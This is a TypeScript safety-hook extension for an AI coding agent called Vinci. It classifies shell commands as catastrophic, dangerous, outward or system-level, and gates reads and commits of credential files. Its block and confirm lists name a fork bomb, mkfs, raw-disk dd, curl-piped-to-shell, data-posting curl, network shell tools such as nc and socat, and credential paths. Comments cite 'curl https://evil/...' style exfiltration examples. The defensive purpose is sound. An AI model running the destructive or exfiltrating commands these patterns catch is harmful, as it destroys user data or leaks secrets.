/**
 * Vinci guard — a default safety hook so Vinci won't help you shoot your own foot off.
 * Intercepts bash tool calls: catastrophic commands are hard-blocked; merely dangerous ones
 * ask for a one-tap confirm. On-brand (the senior engineer who says "that's a bad idea" and
 * means it). Roadmap bucket ① default hook. Additive — no core patch.
 *
 * Tune the lists below; err toward catching the classics, not nagging on routine work.
 */
import { execFileSync } from "node:child_process";
import { createHmac, randomBytes } from "node:crypto";
import { existsSync, lstatSync, mkdirSync, readFileSync, realpathSync, statSync, writeFileSync } from "node:fs";
import { homedir } from "node:os";
import { basename, dirname, isAbsolute, join, resolve, sep } from "node:path";
import {
  type ExtensionAPI,
  type ExtensionContext,
  getAgentDir,
} from "@earendil-works/pi-coding-agent";
import { recordVinciConfirmationGate, sendVinciControl } from "./lib/control.ts";
import { attachImagesFromText } from "./lib/images.ts";
import { redactSecrets, redactSecretsDeep } from "./lib/secrets.ts";
import { planCommandMutates } from "./vinci-plan.ts";

export { redactSecrets, redactSecretsDeep } from "./lib/secrets.ts";

// Set once the user OKs Vinci working outside the project folder this session (so we don't re-ask
// on every edit). Reads outside are always fine; this only gates writes/edits.
let outsideWritesAllowed = false;

// The placeholders redactSecrets() puts in everything the model sees (see lib/secrets.ts). They
// never exist in real files, so their presence in edit/write input means the model is working from
// its masked view.
const MASK_PLACEHOLDER = /<vinci-(?:secret|private-key)>/;

// Generic placeholder base paths a model invents on a from-scratch build instead of using the real
// project cwd. Absolute, and unmistakably not a real user's working directory here.
const PLACEHOLDER_WRITE_PATH =
  /^\/(?:home|Users)\/(?:user|username|youruser|you|yourname|your[-_]?user|me|example|test|dev|developer)(?:\/|$)|^\/path\/to\/|^\/(?:absolute|full)\/path\/|^\/(?:your|my)[-_]?project(?:\/|$)|(?:^|\/)path\/to\/your\//i;

function getVinciHome(): string {
  const configured = process.env.VINCI_HOME?.trim();
  if (!configured) return join(homedir(), ".vinci-code");
  // A relative VINCI_HOME must anchor to the user's home, never to whatever cwd the process
  // happens to have — resolving against process.cwd() would misidentify the store root.
  return isAbsolute(configured) ? configured : join(homedir(), configured);
}

// ── Graduated trust (roadmap ⑤) ──────────────────────────────────────────────────────────────────
// When the user picks "always allow" on a risky command, remember that EXACT command for THIS project
// so we stop re-asking (Claude Code's own data: ~93% of confirms get approved — routine ones are pure
// friction). Exact-match only (any variation still confirms), NEVER for catastrophic or secret-commit,
// and fully inspectable / clearable with /trust. Stored outside any repo, keyed by project path.
// getAgentDir(), never a restated ~/.pi/agent: the agent directory is configurable (its override env
// name is derived from piConfig.name) and a user who moved it must take their trust store with them.
const trustFile = () => process.env.VINCI_TRUST_FILE ?? join(getAgentDir(), "vinci-trust.json");
type TrustStore = Record<string, string[]>;
function loadTrust(): TrustStore {
  try {
    const d = JSON.parse(readFileSync(trustFile(), "utf8"));
    return d && typeof d === "object" ? (d as TrustStore) : {};
  } catch {
    return {};
  }
}
export function isTrusted(cwd: string, cmd: string): boolean {
  const list = loadTrust()[cwd];
  return Array.isArray(list) && list.includes(cmd.trim());
}
export function addTrust(cwd: string, cmd: string): void {
  try {
    const all = loadTrust();
    const list = all[cwd] ?? [];
    const c = cmd.trim();
    if (!list.includes(c)) list.push(c);
    all[cwd] = list;
    mkdirSync(dirname(trustFile()), { recursive: true });
    writeFileSync(trustFile(), JSON.stringify(all, null, 2));
  } catch {
    /* best-effort — a failed write just means we ask again next time */
  }
}
export function clearTrust(cwd: string): void {
  try {
    const all = loadTrust();
    delete all[cwd];
    mkdirSync(dirname(trustFile()), { recursive: true });
    writeFileSync(trustFile(), JSON.stringify(all, null, 2));
  } catch {
    /* best-effort */
  }
}

// 3-way risky-command prompt with a project-remember option. Returns true to allow, false to block.
// If the exact command was already trusted for this project, allows silently (no prompt).
async function confirmRisky(ctx: ExtensionContext, title: string, detail: string, cmd: string): Promise<boolean> {
  const c = cmd.trim();
  if (isTrusted(ctx.cwd, c)) return true;
  const YES = "Yes, run it";
  const ALWAYS = "Always allow this exact command in this project";
  const NO = "No, don't";
  const choice = await ctx.ui.select(`${title}\n\n${detail}`, [NO, YES, ALWAYS]);
  if (choice === ALWAYS) {
    addTrust(ctx.cwd, c);
    ctx.ui.notify("Got it — I won't ask about that exact command in this project again (/allowed to undo).", "info");
    return true;
  }
  return choice === YES;
}

/** Consequential dialogs fail safe: pressing Enter without deliberation chooses No. */
async function confirmSafely(ctx: ExtensionContext, title: string, detail: string): Promise<boolean> {
  const YES = "Yes, allow it";
  const NO = "No, don't";
  return (await ctx.ui.select(`${title}\n\n${detail}`, [NO, YES])) === YES;
}

/** rm with BOTH a recursive and a force flag (any order, combined like -rf or separate). */
function isRecursiveForceRm(cmd: string): boolean {
  return recursiveForceRmTargets(cmd).length > 0;
}

/** Split a shell line at executable control operators, without splitting quoted data. */
function shellSegments(command: string): string[] {
  const segments: string[] = [];
  let current = "";
  let quote: "'" | '"' | "`" | null = null;

  for (let i = 0; i < command.length; i++) {
    const ch = command[i];
    if (quote) {
      current += ch;
      if (quote !== "'" && ch === "\\" && i + 1 < command.length) {
        current += command[++i];
      } else if (ch === quote) {
        quote = null;
      }
      continue;
    }
    if (ch === "'" || ch === '"' || ch === "`") {
      quote = ch;
      current += ch;
      continue;
    }
    if (ch === "\\" && i + 1 < command.length) {
      current += ch + command[++i];
      continue;
    }
    if (ch === ";" || ch === "\n" || ch === "|" || ch === "&") {
      if (current.trim()) segments.push(current.trim());
      current = "";
      if ((ch === "|" || ch === "&") && command[i + 1] === ch) i++;
      continue;
    }
    current += ch;
  }
  if (current.trim()) segments.push(current.trim());
  return segments;
}

/** Split one shell segment into words, removing quotes while preserving quoted word boundaries. */
function shellWords(segment: string): string[] {
  const words: string[] = [];
  let current = "";
  let started = false;
  let quote: "'" | '"' | "`" | null = null;

  for (let i = 0; i < segment.length; i++) {
    const ch = segment[i];
    if (quote) {
      if (quote !== "'" && ch === "\\" && i + 1 < segment.length) {
        current += segment[++i];
      } else if (ch === quote) {
        quote = null;
      } else {
        current += ch;
      }
      continue;
    }
    if (ch === "'" || ch === '"' || ch === "`") {
      quote = ch;
      started = true;
    } else if (ch === "\\" && i + 1 < segment.length) {
      current += segment[++i];
      started = true;
    } else if (/\s/.test(ch)) {
      if (started) words.push(current);
      current = "";
      started = false;
    } else {
      current += ch;
      started = true;
    }
  }
  if (started) words.push(current);
  return words;
}

/** Non-flag operands for each rm invocation carrying both recursive and force flags. */
function recursiveForceRmTargets(command: string): string[][] {
  const invocations: string[][] = [];
  for (const segment of shellSegments(command)) {
    const words = shellWords(commandBody(segment));
    if ((words[0]?.split("/").pop() ?? "").toLowerCase() !== "rm") continue;

    let recursive = false;
    let force = false;
    let parseOptions = true;
    const targets: string[] = [];
    for (const word of words.slice(1)) {
      if (parseOptions && word === "--") {
        parseOptions = false;
      } else if (parseOptions && word.startsWith("--")) {
        recursive ||= word === "--recursive";
        force ||= word === "--force";
      } else if (parseOptions && /^-[^-]/.test(word)) {
        recursive ||= /r/i.test(word.slice(1));
        force ||= /f/i.test(word.slice(1));
      } else {
        targets.push(word);
      }
    }
    if (recursive && force) invocations.push(targets);
  }
  return invocations;
}

const COMMAND_PREFIX = /^(?:(?:[A-Za-z_][A-Za-z0-9_]*=(?:[^\s]+|"[^"]*"|'[^']*'))\s+)*(?:sudo\s+)?(?:command\s+)?/i;
const FILE_REDIRECT = /(?<![0-9&>])>>?(?!\s*(?:\/dev\/null\b|&))\s*\S/;

function commandBody(segment: string): string {
  return segment.replace(COMMAND_PREFIX, "").trim();
}

/**
 * Shell content writers are less reliable than the structured write/edit tools: they bypass file
 * previews, overwrite protection, and edit validation. The model is never allowed to use them.
 */
export function isShellFileWrite(command: string): boolean {
  return shellSegments(command).some((segment) => {
    const body = commandBody(segment);
    if (/^(?:echo|printf)\b/i.test(body) && FILE_REDIRECT.test(body)) return true;
    if (/^tee\b(?:\s+-[A-Za-z]+)*\s+(?!-)(?!\/dev\/null\b)\S+/i.test(body)) return true;
    if (/^cat\b[^\n]*<<-?\s*\S+/i.test(body) && FILE_REDIRECT.test(body)) return true;
    if (/^(?:sed\b[^\n]*\s-i\b|perl\b[^\n]*\s-[A-Za-z]*i[A-Za-z]*\b)/i.test(body)) return true;
    return false;
  });
}

/** Ignore literal echo/printf payloads when classifying risk; they are data, not executed commands. */
export function shellRiskText(command: string): string {
  return shellSegments(command)
    .filter((segment) => {
      const body = commandBody(segment);
      return !/^(?:echo|printf)\b/i.test(body) || /\$\(|`/.test(body);
    })
    .join("\n");
}

/** Git index/history changes are deliberate checkpoints, not a routine implementation detail. */
export function isGitStageOrCommit(command: string): boolean {
  return shellSegments(command).some((segment) => /^(?:git\s+)(?:add|commit)\b/i.test(commandBody(segment)));
}

/** The user must explicitly ask for staging or committing in the current request. Asking to PUSH
 *  counts: a push requires a commit, so "push my fix to GitHub" authorizes the commit it implies —
 *  otherwise the prerequisite is blocked as "not requested" and the whole task dead-ends. */
export function userAskedForGitCheckpoint(request: string): boolean {
  return /\b(commit|committing|stage|staging|push(?:ing)?|save (?:a )?(?:git )?checkpoint|git\s+add)\b/i.test(request);
}

/** A headless (no-UI) block for an action that would normally get a confirmation dialog. Records the
 *  held action as a confirmation gate so the turn closes with an honest handoff naming this step —
 *  a blocked tool_call emits an ERROR tool_result (agent-loop converts the block
 *  into isError: true), so the gate is RECORDED here —
 *  and tells the model not to route around it. Found live 2026-07-15 (Prisma migration): a headless
 *  block with a bare reason drove the model into workaround attempts and a misleading generic BLOCKED.
 *  `extra` appends a site-specific alternative (e.g. ".gitignore it instead"). */
function blockHeadless(gateAction: string, extra = ""): { block: true; reason: string } {
  recordVinciConfirmationGate(gateAction);
  return {
    block: true,
    reason:
      `Blocked (${gateAction}) — no UI to confirm this in a non-interactive run. Don't try to work ` +
      `around it: make the code changes you can, then tell the user this step is waiting on their go-ahead.${extra ? ` ${extra}` : ""}`,
  };
}

/** A root/home operand that makes a recursive-force rm catastrophic. */
const ROOT_TARGET = /^(?:\/\*?|~\/?|\$HOME\/?|\$\{HOME\}\/?)$/;

// Never-safe — hard block, no override inside Vinci.
const CATASTROPHIC: Array<[RegExp, string]> = [
  [/:\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:/, "fork bomb"],
  [/\bmkfs\b/i, "mkfs — formats a filesystem"],
  [/\bdd\b[^|;]*\bof=\/dev\/(sd|nvme|disk|hd|vd)/i, "dd to a raw disk device"],
  [/>\s*\/dev\/(sd|nvme|disk|hd|vd)/i, "overwriting a raw disk device"],
  [/\bgit\s+push\b[^\n]*\s(-f|--force)(?!-with-lease)\b[^\n]*\b(origin\s+)?(main|master|prod|production)\b/i, "force-push to a protected branch"],
];

// Destructive but sometimes legit — confirm first.
const DANGEROUS: Array<[RegExp, string]> = [
  [/\bgit\s+push\b[^\n]*\s(-f|--force)(?!-with-lease)\b/i, "git force-push"],
  [/\bgit\s+reset\s+--hard\b/i, "git reset --hard — discards uncommitted work"],
  [/\bgit\s+clean\s+-[a-z]*f/i, "git clean -f — deletes untracked files"],
  [/\bgit\s+checkout\s+--\s+\./i, "git checkout -- . — discards changes"],
  [/\b(chmod|chown)\b[^\n]*(-R|--recursive)[^\n]*\b777\b/i, "recursive chmod/chown 777"],
  [/\bsudo\b/i, "sudo"],
  [/\b(DROP|TRUNCATE)\s+(TABLE|DATABASE|SCHEMA)\b/i, "destructive SQL (DROP/TRUNCATE)"],
  [/\bprisma\s+migrate\s+reset\b|\bprisma\s+db\s+push\b[^\n]*(--force-reset|--accept-data-loss)\b/i, "reset the database — deletes ALL its data"],
  [/\bdrizzle-kit\s+drop\b|\bsequelize\s+db:migrate:undo:all\b|\b(rails|rake)\s+db:(drop|reset)\b|\bpython\s+manage\.py\s+flush\b|\bknex\s+migrate:rollback\s+--all\b/i, "drop or reset the database"],
  [/\bDELETE\s+FROM\b(?![^;]*\bWHERE\b)/i, "DELETE FROM with no WHERE — deletes every row"],
];

// Reaches the real world — publishing, deploying, or sending data out. Not destructive to YOUR
// machine, but public / irreversible / outward, so a non-programmer must okay it. Confirm.
const OUTWARD: Array<[RegExp, string]> = [
  [/\b(npm|yarn|pnpm)\s+publish\b/i, "publish a package to the public registry"],
  [/\bdocker\s+push\b/i, "push a Docker image to a registry"],
  [/\bvercel\b[^\n]*--prod\b|\bnetlify\s+deploy\b[^\n]*--prod\b|\bfirebase\s+deploy\b|\beas\s+(build|submit)\b|\bfly\s+deploy\b|\bserverless\s+deploy\b|\brailway\s+up\b/i, "deploy to production"],
  [/\b(gcloud|aws|az)\s[^\n]*\b(deploy|apply)\b|\baws\s+s3\s+(sync|cp|rm|mb|rb)\b|\bkubectl\s+apply\b|\bterraform\s+apply\b|\bpulumi\s+up\b|\bhelm\s+(install|upgrade)\b/i, "deploy or change cloud / infrastructure resources"],
  [/\bgh\s+(release\s+create|pr\s+create|repo\s+create)\b/i, "publish something to GitHub"],
  [/\bgit\s+push\b/i, "push commits to a remote repository"],
  [/\b(curl|wget)\b[^\n|]*\s(-X\s*(POST|PUT|PATCH|DELETE)\b|--request\s+(POST|PUT|PATCH|DELETE)\b|(-d|--data|--data-raw|--data-binary|-F|--form|-T|--upload-file)\b)/i, "send data to a server on the internet"],
];
// Changes your whole computer, not just this project. Confirm — "this isn't just your project".
const SYSTEM: Array<[RegExp, string]> = [
  [/\b(npm|pnpm)\s+(i|install|add)\b[^\n]*\s(-g|--global)\b|\byarn\s+global\s+add\b/i, "install software globally on your computer"],
  [/\b(brew|apt|apt-get|gem|cargo|pipx|port)\s+install\b/i, "install system software"],
  [/\b(curl|wget)\b[^\n]*\|\s*(sudo\s+)?(sh|bash|zsh)\b/i, "run a script straight from the internet"],
  [/\bgit\s+config\s+--global\b|\bgit\s+remote\s+(add|set-url|remove|rm)\b/i, "change your git setup (where your code gets sent)"],
  [/(~|\$HOME|\/Users\/[^/\s]+|\/home\/[^/\s]+)\/\.(bashrc|zshrc|bash_profile|zprofile|profile)\b|>\s*\/etc\/|\bcrontab\s+[^-]|\blaunchctl\s+(load|unload|bootstrap)\b|\bsystemctl\s+(enable|start|stop|disable)\b/i, "change your system or startup settings"],
];
const DATABASE: Array<[RegExp, string]> = [
  [/\bprisma\s+migrate\s+(dev|deploy|resolve)\b|\bprisma\s+db\s+push\b/i, "apply a Prisma schema change to the database"],
  [/\bdrizzle-kit\s+(push|migrate)\b|\bsequelize\s+db:migrate\b|\bknex\s+migrate:latest\b|\b(rails|rake)\s+db:migrate\b/i, "apply a schema migration to the database"],
];
const LOCALHOST = /localhost|127\.0\.0\.1|0\.0\.0\.0|\[?::1\]?/i;
const CONSEQUENTIAL: Array<{ list: Array<[RegExp, string]>; title: string; skip?: (cmd: string, why: string) => boolean }> = [
  { list: DATABASE, title: "Vinci — confirm a database change" },
  { list: OUTWARD, title: "Vinci — this reaches the real world", skip: (c, why) => why.startsWith("send data") && LOCALHOST.test(c) },
  { list: SYSTEM, title: "Vinci — this changes your computer" },
];
// Committing secret files puts them in git history and leaks them once pushed. Confirm.
const isCommitSecrets = (cmd: string) =>
  /\bgit\s+(add|commit)\b/i.test(cmd) && /(^|[\s"'/])\.env\b|\.(pem|key|p12|pfx)\b|\b(id_rsa|id_ed25519|id_ecdsa)\b/i.test(cmd);

// The dominant real-world leak isn't `git add .env` (rare) — it's a BROAD add that sweeps in an
// un-gitignored .env the user never named: `git add .` / `git add -A` / `git add --all`, or a
// `git commit -a`/`-am` that stages tracked-but-modified secrets. Detect those so we can look at what
// would actually be staged.
export const isBroadGitStage = (cmd: string) =>
  /\bgit\s+add\s+(?:-A\b|--all\b|\.(?=\s|$)|\*)/i.test(cmd) ||
  /\bgit\s+add\b[^\n]*\s(?:-A|--all)\b/i.test(cmd) ||
  /\bgit\s+commit\b[^\n]*\s-[a-z]*a[a-z]*\b/i.test(cmd);

// A filename that looks like a secret we don't want swept into git.
const SECRET_FILE_RE = /(^|\/)\.env(\.[\w.-]+)?$|\.(pem|key|p12|pfx)$|(^|\/)(id_rsa|id_ed25519|id_ecdsa)$/i;

// Secret files that a broad add/commit would actually stage: git status lists modified+untracked files
// but EXCLUDES gitignored ones, so an .env that's properly gitignored never trips this (no false alarm);
// an un-gitignored one does. Best-effort — any git error just yields "nothing found" (fail open).
function secretsAboutToBeStaged(cwd: string): string[] {
  try {
    const out = execFileSync("git", ["status", "--porcelain", "--untracked-files=all"], {
      cwd,
      stdio: ["ignore", "pipe", "ignore"],
    }).toString();
    return out
      .split("\n")
      .map((l) => l.slice(3).trim()) // strip the 2-char XY status + space
      .filter(Boolean)
      .map((p) => (p.includes(" -> ") ? p.split(" -> ")[1] : p)) // renames: take the new path
      .filter((p) => SECRET_FILE_RE.test(p));
  } catch {
    return [];
  }
}

// Files the model's write/edit tools should not quietly clobber — a non-programmer won't notice an
// overwritten .env until everything breaks. Confirm (not hard-block): editing an .env to add a var
// is legitimate; the point is to make it a deliberate choice, not a silent accident.
const SENSITIVE_PATHS: Array<[RegExp, string]> = [
  [/(^|\/)\.env(\.[\w.-]+)?$/i, "an .env file (your secrets)"],
  [/(^|\/)\.git\//i, "the .git folder (repo internals)"],
  [/\.(pem|key|p12|pfx|crt|cer)$/i, "a private key / certificate"],
  [/(^|\/)(id_rsa|id_ed25519|id_ecdsa)(\.pub)?$/i, "an SSH key"],
  [/(^|\/)node_modules\//i, "node_modules (installed packages)"],
  [/(^|\/)(package-lock\.json|yarn\.lock|pnpm-lock\.yaml|bun\.lockb)$/i, "a lockfile (managed by your package manager)"],
  [/(^|\/)\.(aws|ssh|gnupg|npmrc|netrc)(\/|$)/i, "a credentials file/folder"],
];

/** Files whose contents commonly contain live credentials. Templates are safe to inspect. */
export function isSensitiveReadPath(path: string): boolean {
  const normalized = path.trim().replaceAll("\\", "/");
  if (/(^|\/)\.env\.(?:example|sample|template)$/i.test(normalized)) return false;
  return (
    /(^|\/)\.env(?:\.[\w.-]+)?$/i.test(normalized) ||
    /(^|\/)(?:auth|credentials|secrets?)\.json$/i.test(normalized) ||
    /(^|\/)\.npmrc$/i.test(normalized) ||
    /(^|\/)\.(?:pypirc|netrc|envrc|dev\.vars)$/i.test(normalized) ||
    /(^|\/)(?:terraform\.tfvars|[^/]+\.auto\.tfvars)$/i.test(normalized) ||
    /(^|\/)\.docker\/config\.json$/i.test(normalized) ||
    /(^|\/)\.kube\/config$/i.test(normalized) ||
    /(^|\/)\.config\/gcloud\/(?:application_default_credentials\.json|credentials\.db)$/i.test(normalized) ||
    /(^|\/)(?:service[-_.]?account|firebase[-_.]?admin)[^/]*\.json$/i.test(normalized) ||
    /(^|\/)\.aws\/credentials$/i.test(normalized) ||
    /(^|\/)\.ssh\/(?:id_[^/]+|config)$/i.test(normalized)
  );
}

/** Shell reads which can place credentials directly into the next model-bound tool result. */
export function isSensitiveShellRead(command: string): boolean {
  const risk = shellRiskText(command);
  if (shellSegments(command).some((segment) => /^(?:env|printenv|set)\b/i.test(commandBody(segment)))) return true;
  if (!/\b(?:cat|head|tail|sed|awk|grep|rg|find|less|more|base64|xxd|openssl|tar|zip|python\d*|node)\b/i.test(risk)) {
    return false;
  }
  return /(?:^|[\s'"`])(?:\.\/)?(?:\.env(?:\.[\w.-]+)?|\.envrc|\.dev\.vars|\.npmrc|\.pypirc|\.netrc|terraform\.tfvars|[^\s/]+\.auto\.tfvars|credentials\.json|secrets?\.json|\.aws\/credentials|\.ssh\/id_[^\s/]+|\.docker\/config\.json|\.kube\/config)(?=$|[\s'"`;|&])/i.test(risk);
}

export function isShellNetworkCommand(command: string): boolean {
  const risk = shellRiskText(command);
  return /\b(?:curl|wget|scp|sftp|ssh|nc|ncat|socat|ftp|npx|bunx)\b|\brsync\b[^\n]*(?:\s|^)[^\s]+:[^\s]+|\bgit\s+(?:clone|fetch|pull|push|ls-remote|submodule\s+update)\b|\bgh\s+\w+|\b(?:aws|gcloud|az)\s+\w+|\b(?:npm|pnpm|yarn|bun)\s+(?:i|ci|install|add|update|publish|create|init|exec|dlx|x)\b|\b(?:pip|pip3|uv|pipx)\s+install\b|\b(?:cargo|gem)\s+install\b|\bgo\s+(?:install|get)\b|\bcomposer\s+(?:install|require)\b|\bbundle\s+install\b|\bdeno\s+(?:install|cache)\b|\b(?:brew|apt|apt-get)\s+(?:install|update)\b|\bdocker\s+(?:pull|push|login)\b|\bpod\s+(?:install|update|repo)\b|\b(?:flutter|dart)\s+(?:pub|packages)\s+\w+|\bflutter\s+(?:build|run|create)\b|\b(?:gradle|gradlew)\b|\b(?:mvn|mvnw)\b|\b(?:expo|eas)\s+\w+|\bdotnet\s+(?:restore|add|build|publish)\b|\bpoetry\s+(?:install|add|update)\b|\brustup\s+\w+/i.test(risk);
}

const CLOUD_TOOL =
  /^(?:gcloud|gsutil|bq|aws|az|kubectl|helm|terraform|pulumi|vercel|netlify|firebase|flyctl|fly|railway|serverless|sst|wrangler|supabase|heroku|amplify|eas|doctl)$/i;

/** The executable actually invoked by a shell segment (argv[0]), after env-assignments / sudo, quote-
 *  and path-stripped. Matching the COMMAND WORD — not a token anywhere in the text — is what stops a
 *  `curl … https://evil/gcloud` or a `# gcloud` comment from masquerading as a cloud command. */
function segmentCommandWord(segment: string): string {
  const first = commandBody(segment).match(/^(\S+)/)?.[1] ?? "";
  return (first.replace(/^['"]|['"]$/g, "").split("/").pop() ?? "").toLowerCase();
}

function isCloudDeploySegment(segment: string): boolean {
  const word = segmentCommandWord(segment);
  const body = commandBody(segment);
  return (
    CLOUD_TOOL.test(word) ||
    (word === "docker" && /^docker\s+(?:push|pull|login|build)\b/i.test(body)) ||
    (word === "deno" && /^deno\s+deploy\b/i.test(body))
  );
}

// Deploying/shipping to infrastructure the user already controls (their own cloud accounts, clusters,
// registries). Routine for a non-programmer shipping a project, and the exfil risk is low because the
// tool authenticates to the user's OWN resources — so on an interactive Auto session these get network
// without a per-command prompt. TRUE only when EVERY network-bearing segment is such a tool (judged by
// argv[0]); a single raw curl/wget/nc/ssh/git segment anywhere disqualifies the auto-grant, so it can
// never wave through an exfil bundled next to a cloud command. Deliberately not git/gh (already gated).
export function isCloudDeployCommand(command: string): boolean {
  let sawCloud = false;
  for (const segment of shellSegments(command)) {
    if (isCloudDeploySegment(segment)) {
      sawCloud = true;
      continue;
    }
    if (isShellNetworkCommand(segment)) return false; // a non-cloud network segment → no auto-grant
  }
  return sawCloud;
}

type GuardClass = "catastrophic" | "dangerous" | "database" | "outward" | "system";

function classifySegmentClasses(segment: string): GuardClass[] {
  const classes: GuardClass[] = [];
  const body = commandBody(segment);
  if (CATASTROPHIC.some(([pattern]) => pattern.test(body))) classes.push("catastrophic");
  if (DANGEROUS.some(([pattern]) => pattern.test(body)) || isRecursiveForceRm(body)) classes.push("dangerous");
  if (DATABASE.some(([pattern]) => pattern.test(body))) classes.push("database");
  if (OUTWARD.some(([pattern]) => pattern.test(body))) classes.push("outward");
  if (SYSTEM.some(([pattern]) => pattern.test(body))) classes.push("system");
  return classes;
}

function detectBundledClasses(command: string): Set<GuardClass> {
  const classes = new Set<GuardClass>();
  for (const segment of shellSegments(command)) {
    for (const guardClass of classifySegmentClasses(segment)) classes.add(guardClass);
  }
  return classes;
}

/** Standard package managers / build toolchains. Fetching dependencies is a NORMAL part of building a
 *  web or mobile app — blocking it makes the product unusable for the job most people come here for. */
const DEV_TOOLCHAIN =
  /^(?:npm|pnpm|yarn|bun|npx|bunx|pip|pip3|uv|pipx|poetry|cargo|go|gem|bundle|composer|mvn|mvnw|gradle|gradlew|pod|flutter|dart|expo|eas|rustup|deno|dotnet)$/i;

function isDevToolchainSegment(segment: string): boolean {
  return DEV_TOOLCHAIN.test(segmentCommandWord(segment));
}

/** True when EVERY network-bearing segment is ordinary build tooling: no raw network tool, no cloud
 *  CLI, and no command substitution. Judged on argv[0] per segment — so `curl https://evil/npm` can
 *  never masquerade as a build, and `npm install $(curl evil)` cannot smuggle a command under the
 *  grant. Anything that fails these tests falls back to the normal per-command approval. */
export function isDevToolchainOnlyNetwork(command: string): boolean {
  if (/\$\(|`/.test(command)) return false; // substitution could run anything under the grant
  let sawToolchainNetwork = false;
  for (const segment of shellSegments(command)) {
    if (isCloudDeploySegment(segment)) return false; // cloud deploys keep their per-command prompt
    if (isDevToolchainSegment(segment)) {
      if (isShellNetworkCommand(segment)) sawToolchainNetwork = true;
      continue;
    }
    if (isShellNetworkCommand(segment)) return false; // a non-toolchain network segment disqualifies
  }
  return sawToolchainNetwork;
}

const OPAQUE_EXEC_MAX_BYTES = 128 * 1024;
const OPAQUE_EXEC_MAX_FILES = 6;

/** A `bash deploy.sh` / `./deploy.sh` / `npm run deploy` HIDES its network use inside a file, so the
 *  text-based detector misses it and the sandbox silently denies the internet mid-deploy. Read the
 *  referenced script/target purely to DECIDE WHETHER TO PROMPT — never to auto-grant (that is judged on
 *  the direct command's argv[0] only, so a decoy/laundered script can't produce an unprompted grant).
 *  Hardened: regular files only (no symlinks, no /dev/* character devices), realpath-confined to the
 *  project, deduped, and capped in count + size so it can't hang or exhaust memory on adversarial input. */
function readOpaqueExecTargets(command: string, cwd: string): string {
  let root: string;
  try {
    root = realpathSync(resolve(cwd));
  } catch {
    return "";
  }
  const seen = new Set<string>();
  const texts: string[] = [];
  const readWithin = (candidate: string): void => {
    if (texts.length >= OPAQUE_EXEC_MAX_FILES) return;
    try {
      const full = resolve(cwd, candidate);
      const link = lstatSync(full); // no symlink follow: reject links + devices/fifos before any read
      if (link.isSymbolicLink() || !link.isFile() || link.size > OPAQUE_EXEC_MAX_BYTES) return;
      const real = realpathSync(full);
      if (real !== root && !real.startsWith(root + sep)) return; // the real file must be in the project
      if (seen.has(real)) return;
      seen.add(real);
      texts.push(readFileSync(real, "utf8"));
    } catch {
      /* unreadable / missing → contribute nothing (safe default: no network) */
    }
  };
  // sh/bash/zsh/dash <flags> <file>, and ./<file> or dir/<file>.sh
  for (const m of command.matchAll(/(?:^|[\s|&;(])(?:ba|z|da)?sh\s+(?:-\w+\s+)*([^\s'"|&;()]+)/gi)) readWithin(m[1]);
  for (const m of command.matchAll(/(?:^|[\s|&;(])(\.\/[^\s'"|&;()]+|[\w./-]+\.sh)\b/g)) readWithin(m[1]);
  // npm/pnpm/yarn/bun run <script> → the real command lives in package.json "scripts"
  const run = command.match(/\b(?:npm|pnpm|bun)\s+run\s+([\w:.-]+)|\byarn\s+(?:run\s+)?([\w:.-]+)/i);
  const scriptName = run?.[1] ?? run?.[2];
  if (scriptName && texts.length < OPAQUE_EXEC_MAX_FILES) {
    try {
      const pkgPath = join(root, "package.json");
      const link = lstatSync(pkgPath);
      if (!link.isSymbolicLink() && link.isFile() && link.size <= OPAQUE_EXEC_MAX_BYTES) {
        const pkg = JSON.parse(readFileSync(pkgPath, "utf8")) as { scripts?: Record<string, string> };
        const body = pkg.scripts?.[scriptName];
        if (typeof body === "string") texts.push(body);
      }
    } catch {
      /* no package.json / unreadable → nothing */
    }
  }
  return texts.join("\n");
}

function signSecurityCommand(command: string, cwd: string, scopes: string[]): string {
  process.env.VINCI_SECURITY_NONCE ??= randomBytes(32).toString("hex");
  const grantId = randomBytes(16).toString("hex");
  const normalized = [...new Set(scopes)].sort().join(",");
  const signature = createHmac("sha256", process.env.VINCI_SECURITY_NONCE)
    .update(`${cwd}\0${grantId}\0${normalized}\0${command}`)
    .digest("hex");
  return `# vinci-security-grant:${grantId}:${normalized}:${signature}\n${command}`;
}

export function userAskedForSensitiveRead(request: string): boolean {
  return (
    /\b(?:secret|credential|private key|api key|access token|auth token)s?\b/i.test(request) ||
    /(?:^|[\s`"'])\.env(?!\.(?:example|sample|template)\b)(?=$|[\s`"'])/i.test(request)
  );
}

/** A green CI step that intentionally performs no test is worse than an honest missing-test state. */
export function isFalseGreenTestChange(path: string, proposedContent: string): boolean {
  const file = basename(path).toLowerCase();
  if (file === "package.json") {
    return /["']test["']\s*:[^\n]{0,300}(?:no tests?|tests? (?:not|aren't|are not) (?:specified|configured)|exit\s+0|\btrue\b)/i.test(proposedContent);
  }
  if (/\.ya?ml$/i.test(file) && /(^|\n)\s*-?\s*run:\s*(?:true|echo\s+[^\n]*(?:no tests?|skip tests?))\s*$/im.test(proposedContent)) {
    return true;
  }
  return false;
}

export default function (pi: ExtensionAPI) {
  let latestUserRequest = "";
  let gitCheckpointApproved = false;
  // Build tooling asks for the internet ONCE per session (npm/pip/pod/gradle…), then ordinary dev work
  // runs without a prompt per command. Reset on session_start so a fresh session re-asks.
  let buildNetworkApprovedForSession = false;

  pi.on("input", async (event, ctx) => {
    latestUserRequest = event.text?.trim() ?? "";
    gitCheckpointApproved = userAskedForGitCheckpoint(latestUserRequest);
    const attached = await attachImagesFromText(event.text ?? "", ctx.cwd);
    for (const error of attached.errors) ctx.ui.notify(error, "warning");
    const redacted = redactSecrets(attached.text);
    const images = [...(event.images ?? []), ...attached.images].slice(0, 6);
    return redacted === event.text && images.length === (event.images?.length ?? 0)
      ? { action: "continue" as const }
      : { action: "transform" as const, text: redacted, images };
  });

  // /allowed — see and clear the commands you've told Vinci to always allow in this project.
  // (Named /allowed, not /trust: Pi already has a built-in /trust for project-trust decisions.)
  pi.registerCommand("allowed", {
    description: "See or clear the commands you've told Vinci to always allow in this project",
    handler: async (_args: string, ctx: ExtensionContext) => {
      const list = loadTrust()[ctx.cwd] ?? [];
      if (!list.length) {
        ctx.ui.notify("You haven't told Vinci to always-allow any commands in this project yet.", "info");
        return;
      }
      const CLEAR = "↺ Clear all — ask me again next time";
      const choice = await ctx.ui.select(
        `Always-allowed in this project (${list.length}):`,
        [...list.map((c) => `• ${c}`), CLEAR],
      );
      if (choice === CLEAR) {
        clearTrust(ctx.cwd);
        ctx.ui.notify("Cleared — Vinci will ask again before risky commands here.", "info");
      }
    },
  });

